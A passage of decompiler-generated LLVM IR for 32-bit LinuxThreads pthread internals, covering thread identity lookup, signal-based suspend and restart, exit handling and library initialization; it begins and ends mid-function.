  %v1_804d332 = add i32 %v0_804d317, -1
  store i32 %v1_804d332, i32* @global_var_80627bc.176, align 4
  br label %dec_label_pc_804d341

dec_label_pc_804d33e:                             ; preds = %dec_label_pc_804d317, %entry
  br label %dec_label_pc_804d341

dec_label_pc_804d341:                             ; preds = %dec_label_pc_804d332, %dec_label_pc_804d328, %dec_label_pc_804d33e
  %v0_804d341 = phi i32 [ %v0_804d317, %dec_label_pc_804d332 ], [ %v0_804d30c, %dec_label_pc_804d328 ], [ -1, %dec_label_pc_804d33e ]
  ret i32 %v0_804d341

; uselistorder directives
  uselistorder label %dec_label_pc_804d341, { 2, 0, 1 }
}

define i32 @pthread_equal(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v15_804d348 = icmp eq i32 %arg1, %arg2
  %v1_804d34c = zext i1 %v15_804d348 to i32
  ret i32 %v1_804d34c
}

define i32 @pthread_handle_sigdebug() local_unnamed_addr {
entry:
  %v0_804d353 = load i32, i32* @eax, align 4
  ret i32 %v0_804d353
}

define i32 @__pthread_setconcurrency(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @global_var_8063004.177, align 4
  ret i32 0
}

define i32 @__pthread_getconcurrency() local_unnamed_addr {
entry:
  %v0_804d360 = load i32, i32* @global_var_8063004.177, align 4
  ret i32 %v0_804d360
}

define i32 @__pthread_timedsuspend_new(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %edx.global-to-local = alloca i32, align 4
  %tmp7 = call i64 @__decompiler_undefined_function_2()
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-276 = alloca i32, align 4
  %stack_var_-148 = alloca i32, align 4
  %stack_var_-432 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804d366 = load i32, i32* @ebx, align 4
  store i32 %v0_804d366, i32* %stack_var_-4, align 4
  %v2_804d36f = ptrtoint i32* %stack_var_-432 to i32
  %v3_804d374 = call i32 @__sigsetjmp(i32 %v2_804d36f, i32* inttoptr (i32 1 to i32*))
  store i32 1, i32* @edx, align 4
  %v1_804d381 = icmp eq i32 %v3_804d374, 0
  %v1_804d383 = icmp eq i1 %v1_804d381, false
  br i1 %v1_804d383, label %entry.dec_label_pc_804d468_crit_edge, label %dec_label_pc_804d389

entry.dec_label_pc_804d468_crit_edge:             ; preds = %entry
  %.pre = add i32 %arg1, 36
  %.pre4 = inttoptr i32 %.pre to i32*
  br label %dec_label_pc_804d468

dec_label_pc_804d389:                             ; preds = %entry
  %tmp6 = ptrtoint i32* %arg2 to i32
  store i32 %arg1, i32* %edx.global-to-local, align 4
  %v2_804d397 = add i32 %arg1, 36
  %v3_804d397 = inttoptr i32 %v2_804d397 to i32*
  store i32 %v2_804d36f, i32* %v3_804d397, align 4
  %v0_804d39a = load i32, i32* %edx.global-to-local, align 4
  %v1_804d39a = add i32 %v0_804d39a, 32
  %v2_804d39a = inttoptr i32 %v1_804d39a to i32*
  store i32 0, i32* %v2_804d39a, align 4
  %v2_804d3a1 = ptrtoint i32* %stack_var_-148 to i32
  store i32 %v2_804d3a1, i32* @ebx, align 4
  %v1_804d3a9 = call i32 @sigemptyset(i32 %v2_804d3a1)
  store i32 1, i32* %edx.global-to-local, align 4
  %v0_804d3b0 = load i32, i32* @global_var_80626e8.171, align 8
  %v2_804d3b7 = call i32 @__GI_sigaddset(i32 %v2_804d3a1, i32 %v0_804d3b0)
  %v2_804d3bf = ptrtoint i32* %stack_var_-276 to i32
  %v3_804d3ca = bitcast i32* %stack_var_-148 to %_TYPEDEF_sigset_t*
  %v4_804d3ca = call i32 @__GI_sigprocmask(i32 1, %_TYPEDEF_sigset_t* %v3_804d3ca, i32 %v2_804d3bf)
  %v2_804d3d6 = ptrtoint i32* %stack_var_-12 to i32
  %v7_804d3e3 = mul nsw i64 %tmp7, 1000
  %v8_804d3e3 = trunc i64 %v7_804d3e3 to i32
  %v1_804d3f5 = add i32 %tmp6, 4
  %v2_804d3f5 = inttoptr i32 %v1_804d3f5 to i32*
  %v2_804d43d = ptrtoint i32* %stack_var_-20 to i32
  br label %dec_label_pc_804d3d2

dec_label_pc_804d3d2:                             ; preds = %dec_label_pc_804d439, %dec_label_pc_804d389
  %v0_804d3d2 = load i32, i32* @ecx, align 4
  %v4_804d3de = call i32 @gettimeofday(i32 %v2_804d3d6, i32 0, i32 %v0_804d3d2, i32 %v0_804d3d2)
  %v3_804d3f5 = load i32, i32* %v2_804d3f5, align 4
  store i32 %v3_804d3f5, i32* %edx.global-to-local, align 4
  %v2_804d3f8 = load i32, i32* %arg2, align 4
  %v4_804d3fa = load i32, i32* %stack_var_-12, align 4
  %v5_804d3fa = sub i32 %v2_804d3f8, %v4_804d3fa
  %v2_804d401 = sub i32 %v3_804d3f5, %v8_804d3e3
  %v13_804d401 = icmp slt i32 %v2_804d401, 0
  store i32 %v2_804d401, i32* %edx.global-to-local, align 4
  %v1_804d416 = icmp eq i1 %v13_804d401, false
  br i1 %v1_804d416, label %dec_label_pc_804d42f, label %dec_label_pc_804d418

dec_label_pc_804d418:                             ; preds = %dec_label_pc_804d3d2
  %v1_804d425 = add i32 %v5_804d3fa, -1
  br label %dec_label_pc_804d42f

dec_label_pc_804d42f:                             ; preds = %dec_label_pc_804d3d2, %dec_label_pc_804d418
  %storemerge = phi i32 [ %v1_804d425, %dec_label_pc_804d418 ], [ %v5_804d3fa, %dec_label_pc_804d3d2 ]
  %v3_804d42f = phi i32 [ %v1_804d425, %dec_label_pc_804d418 ], [ %v5_804d3fa, %dec_label_pc_804d3d2 ]
  store i32 %storemerge, i32* %stack_var_-20, align 4
  %v5_804d42f = icmp slt i32 %v3_804d42f, 0
  br i1 %v5_804d42f, label %dec_label_pc_804d451, label %dec_label_pc_804d439

dec_label_pc_804d439:                             ; preds = %dec_label_pc_804d42f
  %v2_804d445 = call i32 @__libc_nanosleep(i32 %v2_804d43d, i32 0)
  %v1_804d44d = icmp eq i32 %v2_804d445, 0
  %v1_804d44f = icmp eq i1 %v1_804d44d, false
  br i1 %v1_804d44f, label %dec_label_pc_804d3d2, label %dec_label_pc_804d451

dec_label_pc_804d451:                             ; preds = %dec_label_pc_804d439, %dec_label_pc_804d42f
  %v3_804d45e = bitcast i32* %stack_var_-276 to %_TYPEDEF_sigset_t*
  %v4_804d45e = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* %v3_804d45e, i32 0)
  store i32 0, i32* @edx, align 4
  br label %dec_label_pc_804d468

dec_label_pc_804d468:                             ; preds = %entry.dec_label_pc_804d468_crit_edge, %dec_label_pc_804d451
  %v2_804d46f.pre-phi = phi i32* [ %.pre4, %entry.dec_label_pc_804d468_crit_edge ], [ %v3_804d397, %dec_label_pc_804d451 ]
  store i32 %arg1, i32* @ecx, align 4
  store i32 0, i32* %v2_804d46f.pre-phi, align 4
  %v0_804d476 = load i32, i32* @edx, align 4
  %v2_804d47e = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804d47e, i32* @ebx, align 4
  ret i32 %v0_804d476

; uselistorder directives
  uselistorder i32 %v1_804d425, { 1, 0 }
  uselistorder i32 %v5_804d3fa, { 1, 0, 2 }
  uselistorder i32 (i32, i32)* @__libc_nanosleep, { 1, 0 }
  uselistorder i32 (i32, i32*)* @__sigsetjmp, { 1, 0 }
  uselistorder i32 %arg1, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_804d468, { 1, 0 }
  uselistorder label %dec_label_pc_804d42f, { 1, 0 }
}

define i32 @__pthread_restart_new(i32 %arg1) local_unnamed_addr {
entry:
  %v0_804d483 = load i32, i32* @global_var_80626e8.171, align 8
  %v1_804d48d = add i32 %arg1, 20
  %v2_804d48d = inttoptr i32 %v1_804d48d to i32*
  %v3_804d48d = load i32, i32* %v2_804d48d, align 4
  %v2_804d490 = call i32 @kill(i32 %v3_804d48d, i32 %v0_804d483)
  ret i32 %v2_804d490
}

define i32 @__pthread_wait_for_restart_signal(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-136 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804d499 = load i32, i32* @esi, align 4
  %v0_804d49a = load i32, i32* @ebx, align 4
  store i32 %v0_804d49a, i32* %stack_var_-8, align 4
  %v2_804d4a1 = ptrtoint i32* %stack_var_-136 to i32
  store i32 %v2_804d4a1, i32* @ebx, align 4
  store i32 %arg1, i32* @esi, align 4
  %v4_804d4b1 = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* null, i32 %v2_804d4a1)
  %v1_804d4bf = call i32 @__GI_sigdelset(i32 %v2_804d4a1)
  %v0_804d4c4 = load i32, i32* @esi, align 4
  %v1_804d4c4 = add i32 %v0_804d4c4, 32
  %v2_804d4c4 = inttoptr i32 %v1_804d4c4 to i32*
  store i32 0, i32* %v2_804d4c4, align 4
  %v1_804d4d6 = bitcast i32* %stack_var_-136 to %_TYPEDEF_sigset_t*
  br label %dec_label_pc_804d4ce

dec_label_pc_804d4ce:                             ; preds = %dec_label_pc_804d4ce, %entry
  %v2_804d4d6 = call i32 @__libc_sigsuspend(%_TYPEDEF_sigset_t* %v1_804d4d6)
  %v0_804d4db = load i32, i32* @esi, align 4
  %v1_804d4db = add i32 %v0_804d4db, 32
  %v2_804d4db = inttoptr i32 %v1_804d4db to i32*
  %v3_804d4db = load i32, i32* %v2_804d4db, align 4
  %v1_804d4e1 = load i32, i32* @global_var_80626e8.171, align 8
  %v12_804d4e1 = icmp eq i32 %v3_804d4db, %v1_804d4e1
  %v1_804d4e7 = icmp eq i1 %v12_804d4e1, false
  br i1 %v1_804d4e7, label %dec_label_pc_804d4ce, label %dec_label_pc_804d4e9

dec_label_pc_804d4e9:                             ; preds = %dec_label_pc_804d4ce
  %v2_804d4ef = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804d4ef, i32* @ebx, align 4
  store i32 %v0_804d499, i32* @esi, align 4
  ret i32 %v3_804d4db

; uselistorder directives
  uselistorder i32 %v3_804d4db, { 1, 0 }
  uselistorder i32 %v2_804d4a1, { 1, 0, 2 }
  uselistorder i32 (%_TYPEDEF_sigset_t*)* @__libc_sigsuspend, { 1, 0 }
}

define i32 @suspend.6() local_unnamed_addr {
entry:
  %v0_804d4f5 = load i32, i32* @eax, align 4
  %v1_804d4f6 = call i32 @__pthread_wait_for_restart_signal(i32 %v0_804d4f5)
  ret i32 %v1_804d4f6
}

define i32 @__pthread_find_self() local_unnamed_addr {
entry:
  %stack_var_0 = alloca i32, align 4
  %v1_804d4ff = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_804d4ff, i32* @ecx, align 4
  br label %dec_label_pc_804d50b

dec_label_pc_804d508:                             ; preds = %dec_label_pc_804d512, %dec_label_pc_804d50b
  %v1_804d508 = add i32 %v0_804d508, 16
  br label %dec_label_pc_804d50b

dec_label_pc_804d50b:                             ; preds = %entry, %dec_label_pc_804d508
  %v0_804d508 = phi i32 [ ptrtoint (i32* @global_var_805e320.178 to i32), %entry ], [ %v1_804d508, %dec_label_pc_804d508 ]
  store i32 %v0_804d508, i32* @edx, align 4
  %v1_804d50b = add i32 %v0_804d508, 8
  %v2_804d50b = inttoptr i32 %v1_804d50b to i32*
  %v3_804d50b = load i32, i32* %v2_804d50b, align 4
  %v6_804d510 = icmp ugt i32 %v1_804d4ff, %v3_804d50b
  br i1 %v6_804d510, label %dec_label_pc_804d508, label %dec_label_pc_804d512

dec_label_pc_804d512:                             ; preds = %dec_label_pc_804d50b
  %v2_804d512 = add i32 %v0_804d508, 12
  %v3_804d512 = inttoptr i32 %v2_804d512 to i32*
  %v4_804d512 = load i32, i32* %v3_804d512, align 4
  %v10_804d512 = icmp ult i32 %v1_804d4ff, %v4_804d512
  br i1 %v10_804d512, label %dec_label_pc_804d508, label %dec_label_pc_804d517

dec_label_pc_804d517:                             ; preds = %dec_label_pc_804d512
  ret i32 %v3_804d50b

; uselistorder directives
  uselistorder i32 %v0_804d508, { 1, 2, 3, 0 }
  uselistorder i32 %v1_804d4ff, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804d50b, { 1, 0 }
}

define i32 @thread_self.7(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_2096672 = alloca i32, align 4
  %v0_804d51f = load i32, i32* @esp, align 4
  %v1_804d51f = load i32, i32* @global_var_8062fec.134, align 4
  %v7_804d51f = icmp ult i32 %v0_804d51f, %v1_804d51f
  %v1_804d525 = icmp eq i1 %v7_804d51f, false
  br i1 %v1_804d525, label %dec_label_pc_804d556, label %dec_label_pc_804d527

dec_label_pc_804d527:                             ; preds = %entry
  %v1_804d527 = load i32, i32* @global_var_8062ff0.135, align 16
  %v7_804d527 = icmp ult i32 %v0_804d51f, %v1_804d527
  br i1 %v7_804d527, label %dec_label_pc_804d53c, label %dec_label_pc_804d52f

dec_label_pc_804d52f:                             ; preds = %dec_label_pc_804d527
  %v1_804d534 = load i32, i32* @global_var_8062ff4.137, align 4
  %v7_804d534 = icmp ult i32 %v0_804d51f, %v1_804d534
  br i1 %v7_804d534, label %dec_label_pc_804d556, label %dec_label_pc_804d53c

dec_label_pc_804d53c:                             ; preds = %dec_label_pc_804d52f, %dec_label_pc_804d527
  %v0_804d53c = load i32, i32* @global_var_8067650.138, align 16
  %v1_804d53c = icmp eq i32 %v0_804d53c, 0
  br i1 %v1_804d53c, label %dec_label_pc_804d54a, label %dec_label_pc_804d545

dec_label_pc_804d545:                             ; preds = %dec_label_pc_804d53c
  %v0_804d545 = call i32 @__pthread_find_self()
  br label %dec_label_pc_804d54a

dec_label_pc_804d54a:                             ; preds = %dec_label_pc_804d53c, %dec_label_pc_804d545
  %v2_804d550 = ptrtoint i32* %stack_var_2096672 to i32
  br label %dec_label_pc_804d556

dec_label_pc_804d556:                             ; preds = %dec_label_pc_804d52f, %entry, %dec_label_pc_804d54a
  %v0_804d556 = phi i32 [ ptrtoint (i32* @global_var_8062500.136 to i32), %dec_label_pc_804d52f ], [ ptrtoint (i32* @global_var_8062320 to i32), %entry ], [ %v2_804d550, %dec_label_pc_804d54a ]
  ret i32 %v0_804d556

; uselistorder directives
  uselistorder label %dec_label_pc_804d556, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804d54a, { 1, 0 }
}

define i32 @pthread_onexit_process(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-188 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %v0_804d557 = load i32, i32* @ebx, align 4
  %v0_804d55e = load i32, i32* @global_var_80626e4.143, align 4
  %v2_804d55e = icmp slt i32 %v0_804d55e, 0
  br i1 %v2_804d55e, label %entry.dec_label_pc_804d5e4_crit_edge, label %dec_label_pc_804d567

entry.dec_label_pc_804d5e4_crit_edge:             ; preds = %entry
  %v0_804d5eb.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_804d5e4

dec_label_pc_804d567:                             ; preds = %entry
  %v1_804d567 = call i32 @thread_self.7(i32 %v0_804d557)
  store i32 %v1_804d567, i32* @ebx, align 4
  store i32 %v1_804d567, i32* %stack_var_-152, align 4
  %v2_804d585 = ptrtoint i32* %stack_var_-152 to i32
  br label %dec_label_pc_804d585

dec_label_pc_804d585:                             ; preds = %dec_label_pc_804d5a1, %dec_label_pc_804d567
  %v0_804d590 = load i32, i32* @global_var_80626e4.143, align 4
  store i32 %v0_804d590, i32* %stack_var_-188, align 4
  %v3_804d596 = call i32 @__libc_write(i32 %v0_804d590, i32 %v2_804d585, i32 148)
  %v8_804d59e = icmp eq i32 %v3_804d596, -1
  %v1_804d59f = icmp eq i1 %v8_804d59e, false
  br i1 %v1_804d59f, label %dec_label_pc_804d5ab, label %dec_label_pc_804d5a1

dec_label_pc_804d5a1:                             ; preds = %dec_label_pc_804d585
  %v0_804d5a1 = load i32, i32* %stack_var_-188, align 4
  %v1_804d5a1 = call i32 @__errno_location(i32 %v0_804d5a1)
  %v1_804d5a6 = inttoptr i32 %v1_804d5a1 to i32*
  %v2_804d5a6 = load i32, i32* %v1_804d5a6, align 4
  %v11_804d5a6 = icmp eq i32 %v2_804d5a6, 4
  br i1 %v11_804d5a6, label %dec_label_pc_804d585, label %dec_label_pc_804d5ab

dec_label_pc_804d5ab:                             ; preds = %dec_label_pc_804d5a1, %dec_label_pc_804d585
  %v0_804d5ab = load i32, i32* @ebx, align 4
  store i32 %v0_804d5ab, i32* @eax, align 4
  %v0_804d5ad = call i32 @suspend.6()
  %v0_804d5b2 = load i32, i32* @ebx, align 4
  %v1_804d5b2 = load i32, i32* bitcast (i32** @global_var_80626e0.144 to i32*), align 32
  %v12_804d5b2 = icmp eq i32 %v0_804d5b2, %v1_804d5b2
  %v1_804d5b8 = icmp eq i1 %v12_804d5b2, false
  br i1 %v1_804d5b8, label %dec_label_pc_804d5ab.dec_label_pc_804d5e4_crit_edge, label %dec_label_pc_804d5ba

dec_label_pc_804d5ab.dec_label_pc_804d5e4_crit_edge: ; preds = %dec_label_pc_804d5ab
  br label %dec_label_pc_804d5e4

dec_label_pc_804d5ba:                             ; preds = %dec_label_pc_804d5ab
  %v0_804d5c2 = load i32, i32* @global_var_8062514.140, align 4
  store i32 %v0_804d5c2, i32* %stack_var_-188, align 4
  %v4_804d5c8 = call i32 @waitpid(i32 %v0_804d5c2, i32 0, i32 -2147483648, i32 %v0_804d5ad)
  store i32 0, i32* @global_var_8062ff4.137, align 4
  store i32 0, i32* @global_var_8062ff0.135, align 16
  br label %dec_label_pc_804d5e4

dec_label_pc_804d5e4:                             ; preds = %entry.dec_label_pc_804d5e4_crit_edge, %dec_label_pc_804d5ab.dec_label_pc_804d5e4_crit_edge, %dec_label_pc_804d5ba
  %v0_804d5eb = phi i32 [ %v0_804d5ad, %dec_label_pc_804d5ab.dec_label_pc_804d5e4_crit_edge ], [ %v0_804d5eb.pre, %entry.dec_label_pc_804d5e4_crit_edge ], [ %v4_804d5c8, %dec_label_pc_804d5ba ]
  store i32 %v0_804d557, i32* @ebx, align 4
  ret i32 %v0_804d5eb

; uselistorder directives
  uselistorder i32* %stack_var_-152, { 1, 0 }
  uselistorder i32* %stack_var_-188, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804d5e4, { 2, 1, 0 }
}

define i32 @__GI_pthread_self(i32 %arg1) local_unnamed_addr {
entry:
  %v1_804d5ec = call i32 @thread_self.7(i32 ptrtoint (i32* @0 to i32))
  %v1_804d5f1 = add i32 %v1_804d5ec, 16
  %v2_804d5f1 = inttoptr i32 %v1_804d5f1 to i32*
  %v3_804d5f1 = load i32, i32* %v2_804d5f1, align 4
  ret i32 %v3_804d5f1
}

define i32 @__pthread_reset_main_thread() local_unnamed_addr {
entry:
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_804d5f5 = load i32, i32* @ebx, align 4
  store i32 %v0_804d5f5, i32* %stack_var_-4, align 4
  %v1_804d5f9 = call i32 @thread_self.7(i32 %v0_804d5f5)
  %v0_804d5fe = load i32, i32* @global_var_80626e4.143, align 4
  %v10_804d5fe = icmp eq i32 %v0_804d5fe, -1
  store i32 %v1_804d5f9, i32* @ebx, align 4
  br i1 %v10_804d5fe, label %dec_label_pc_804d65a, label %dec_label_pc_804d609

dec_label_pc_804d609:                             ; preds = %entry
  %v0_804d60c = load i32, i32* @global_var_8062ff0.135, align 16
  %v1_804d612 = call i32 @free(i32 %v0_804d60c)
  %v0_804d618 = load i32, i32* @global_var_80626e4.143, align 4
  store i32 0, i32* @global_var_8062ff4.137, align 4
  store i32 0, i32* @global_var_8062ff0.135, align 16
  %v1_804d632 = call i32 @__libc_close(i32 %v0_804d618)
  %v0_804d638 = load i32, i32* @global_var_8067668.179, align 8
  %v1_804d63e = call i32 @__libc_close(i32 %v0_804d638)
  store i32 -1, i32* @global_var_8067668.179, align 8
  store i32 -1, i32* @global_var_80626e4.143, align 4
  br label %dec_label_pc_804d65a

dec_label_pc_804d65a:                             ; preds = %entry, %dec_label_pc_804d609
  %v0_804d65a = phi i32 [ %tmp3, %entry ], [ %v0_804d638, %dec_label_pc_804d609 ]
  %v1_804d65a = call i32 @__libc_getpid(i32 %v0_804d65a)
  %v1_804d65f = load i32, i32* @ebx, align 4
  %v2_804d65f = add i32 %v1_804d65f, 20
  %v3_804d65f = inttoptr i32 %v2_804d65f to i32*
  store i32 %v1_804d65a, i32* %v3_804d65f, align 4
  %v0_804d662 = load i32, i32* @ebx, align 4
  store i32 %v0_804d662, i32* bitcast (i32** @global_var_80626e0.144 to i32*), align 32
  %v2_804d668 = inttoptr i32 %v0_804d662 to i32*
  store i32 %v0_804d662, i32* %v2_804d668, align 4
  %v0_804d66a = load i32, i32* @ebx, align 4
  %v2_804d66a = add i32 %v0_804d66a, 4
  %v3_804d66a = inttoptr i32 %v2_804d66a to i32*
  store i32 %v0_804d66a, i32* %v3_804d66a, align 4
  %v0_804d66d = load i32, i32* @ebx, align 4
  %v1_804d66d = add i32 %v0_804d66d, 68
  %v2_804d66d = inttoptr i32 %v1_804d66d to i32*
  store i32 ptrtoint (i32* @global_var_8065058.180 to i32), i32* %v2_804d66d, align 4
  %v0_804d674 = load i32, i32* @ebx, align 4
  %v1_804d674 = add i32 %v0_804d674, 76
  %v2_804d674 = inttoptr i32 %v1_804d674 to i32*
  store i32 ptrtoint (i32* @global_var_806505c.181 to i32), i32* %v2_804d674, align 4
  %v2_804d67d = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804d67d, i32* @ebx, align 4
  ret i32 %v1_804d65a

; uselistorder directives
  uselistorder i32 %v0_804d66a, { 1, 0 }
  uselistorder i32 %v0_804d662, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804d65a, { 1, 0 }
}

define i32 @__pthread_kill_other_threads_np() local_unnamed_addr {
entry:
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-140 = alloca i32, align 4
  %v2_804d68a = call i32 @pthread_onexit_process(i32 0, i32 0)
  %v0_804d68f = call i32 @__pthread_reset_main_thread()
  %v2_804d695 = ptrtoint i32* %stack_var_-140 to i32
  %v2_804d699 = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v2_804d699, i32* @ebx, align 4
  %v1_804d69e = call i32 @sigemptyset(i32 %v2_804d695)
  store i32 0, i32* %stack_var_-144, align 4
  %v0_804d6bc = load i32, i32* @global_var_80626e8.171, align 8
  %v4_804d6c2 = call i32 @__libc_sigaction(i32 %v0_804d6bc, i32* nonnull %stack_var_-144, i32 0)
  %v0_804d6cd = load i32, i32* @global_var_80626ec.155, align 4
  %v4_804d6d3 = call i32 @__libc_sigaction(i32 %v0_804d6cd, i32* nonnull %stack_var_-144, i32 0)
  %v0_804d6d8 = load i32, i32* @global_var_80626f0.146, align 16
  %tmp12 = icmp slt i32 %v0_804d6d8, 1
  br i1 %tmp12, label %dec_label_pc_804d6f1, label %dec_label_pc_804d6e4

dec_label_pc_804d6e4:                             ; preds = %entry
  %v4_804d6e9 = call i32 @__libc_sigaction(i32 %v0_804d6d8, i32* nonnull %stack_var_-144, i32 0)
  br label %dec_label_pc_804d6f1

dec_label_pc_804d6f1:                             ; preds = %entry, %dec_label_pc_804d6e4
  %v0_804d6f8 = phi i32 [ %v0_804d6d8, %entry ], [ %v4_804d6e9, %dec_label_pc_804d6e4 ]
  ret i32 %v0_804d6f8

; uselistorder directives
  uselistorder i32 %v0_804d6d8, { 1, 2, 0 }
  uselistorder i32 ()* @__pthread_reset_main_thread, { 1, 0 }
  uselistorder label %dec_label_pc_804d6f1, { 1, 0 }
}

define i32 @pthread_initialize(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-284 = alloca i32, align 4
  %stack_var_-280 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-6291456 = alloca i32, align 4
  %v0_804d6f9 = load i32, i32* @esi, align 4
  %v0_804d6fa = load i32, i32* @ebx, align 4
  %v0_804d701 = load i32, i32* @global_var_8062fec.134, align 4
  %v1_804d701 = icmp eq i32 %v0_804d701, 0
  %v1_804d708 = icmp eq i1 %v1_804d701, false
  br i1 %v1_804d708, label %dec_label_pc_804d893, label %dec_label_pc_804d70e

dec_label_pc_804d70e:                             ; preds = %entry
  %v4_804d715 = ptrtoint i32* %stack_var_-6291456 to i32
  store i32 %v4_804d715, i32* %eax.global-to-local, align 4
  store i32 %v4_804d715, i32* @global_var_8062fec.134, align 4
  %v1_804d71f = call i32 @__libc_getpid(i32 %v0_804d6fa)
  store i32 %v1_804d71f, i32* @global_var_8062334.182, align 4
  %v0_804d729 = load i32, i32* bitcast (i32** @global_var_80627dc.184 to i32*), align 4
  store i32 %v0_804d729, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_8065058.180 to i32), i32* bitcast (i32** @global_var_8062364.185 to i32*), align 4
  store i32 ptrtoint (i32* @global_var_806505c.181 to i32), i32* bitcast (i32** @global_var_806236c.186 to i32*), align 4
  store i32 0, i32* @global_var_8062810.187, align 16
  %v1_804d75e4 = icmp eq i32 %v0_804d729, 0
  %v1_804d76011 = icmp eq i1 %v1_804d75e4, false
  br i1 %v1_804d76011, label %dec_label_pc_804d74e, label %dec_label_pc_804d762

dec_label_pc_804d74e:                             ; preds = %dec_label_pc_804d70e, %dec_label_pc_804d75b
  %v0_804d754 = phi i32 [ %v3_804d75b, %dec_label_pc_804d75b ], [ %v0_804d729, %dec_label_pc_804d70e ]
  %v1_804d74e = add i32 %v0_804d754, 52
  %v2_804d74e = inttoptr i32 %v1_804d74e to i32*
  %v3_804d74e = load i32, i32* %v2_804d74e, align 4
  %v12_804d74e = icmp eq i32 %v3_804d74e, 1
  br i1 %v12_804d74e, label %dec_label_pc_804d75b, label %dec_label_pc_804d754

dec_label_pc_804d754:                             ; preds = %dec_label_pc_804d74e
  store i32 0, i32* %v2_804d74e, align 4
  %v0_804d75b.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d75b

dec_label_pc_804d75b:                             ; preds = %dec_label_pc_804d74e, %dec_label_pc_804d754
  %v0_804d75b = phi i32 [ %v0_804d754, %dec_label_pc_804d74e ], [ %v0_804d75b.pre, %dec_label_pc_804d754 ]
  %v1_804d75b = add i32 %v0_804d75b, 32
  %v2_804d75b = inttoptr i32 %v1_804d75b to i32*
  %v3_804d75b = load i32, i32* %v2_804d75b, align 4
  store i32 %v3_804d75b, i32* %eax.global-to-local, align 4
  %v1_804d75e = icmp eq i32 %v3_804d75b, 0
  %v1_804d760 = icmp eq i1 %v1_804d75e, false
  br i1 %v1_804d760, label %dec_label_pc_804d74e, label %dec_label_pc_804d75e.dec_label_pc_804d762_crit_edge

dec_label_pc_804d75e.dec_label_pc_804d762_crit_edge: ; preds = %dec_label_pc_804d75b
  br label %dec_label_pc_804d762

dec_label_pc_804d762:                             ; preds = %dec_label_pc_804d75e.dec_label_pc_804d762_crit_edge, %dec_label_pc_804d70e
  %v2_804d764 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %v2_804d764, i32* @ebx, align 4
  %v2_804d76e = call i32 @getrlimit(i32 3, i32 %v2_804d764)
  store i32 %v2_804d76e, i32* %eax.global-to-local, align 4
  %v1_804d773 = call i32 @__GI_getpagesize(i32 3)
  %v2_804d77d = mul i32 %v1_804d773, 2
  store i32 %v2_804d77d, i32* %eax.global-to-local, align 4
  %v2_804d782 = sub i32 2097152, %v2_804d77d
  %v3_804d784 = load i32, i32* %stack_var_-16, align 4
  %tmp = icmp ugt i32 %v3_804d784, %v2_804d782
  br i1 %tmp, label %dec_label_pc_804d78d, label %dec_label_pc_804d7a1

dec_label_pc_804d78d:                             ; preds = %dec_label_pc_804d762
  store i32 %v2_804d782, i32* %stack_var_-16, align 4
  %v6_804d799 = bitcast i32* %stack_var_-16 to %rlimit*
  %v7_804d799 = call i32 @__GI_setrlimit(i32 3, %rlimit* %v6_804d799, i32 %v2_804d77d, i32 %v2_804d77d)
  store i32 %v7_804d799, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d7a1

dec_label_pc_804d7a1:                             ; preds = %dec_label_pc_804d762, %dec_label_pc_804d78d
  store i32 134536171, i32* %stack_var_-284, align 4
  %v2_804d7ac = ptrtoint i32* %stack_var_-280 to i32
  store i32 %v2_804d7ac, i32* @ebx, align 4
  %v2_804d7b0 = ptrtoint i32* %stack_var_-284 to i32
  store i32 %v2_804d7b0, i32* @esi, align 4
  %v1_804d7b5 = call i32 @sigemptyset(i32 %v2_804d7ac)
  store i32 %v1_804d7b5, i32* %eax.global-to-local, align 4
  %v0_804d7cb = load i32, i32* @global_var_80626e8.171, align 8
  %v5_804d7d1 = call i32 @__libc_sigaction(i32 %v0_804d7cb, i32* nonnull %stack_var_-284, i32 0)
  store i32 134536026, i32* %stack_var_-284, align 4
  store i32 %v2_804d7b0, i32* %eax.global-to-local, align 4
  %v0_804d7e0 = load i32, i32* @global_var_80626e8.171, align 8
  %v2_804d7e7 = call i32 @__GI_sigaddset(i32 %v2_804d7ac, i32 %v0_804d7e0)
  store i32 %v2_804d7e7, i32* %eax.global-to-local, align 4
  %v0_804d7f2 = load i32, i32* @global_var_80626ec.155, align 4
  %v5_804d7f8 = call i32 @__libc_sigaction(i32 %v0_804d7f2, i32* nonnull %stack_var_-284, i32 0)
  store i32 %v5_804d7f8, i32* %eax.global-to-local, align 4
  %v0_804d800 = load i32, i32* @global_var_80626f0.146, align 16
  %tmp34 = icmp slt i32 %v0_804d800, 1
  br i1 %tmp34, label %dec_label_pc_804d82e, label %dec_label_pc_804d809

dec_label_pc_804d809:                             ; preds = %dec_label_pc_804d7a1
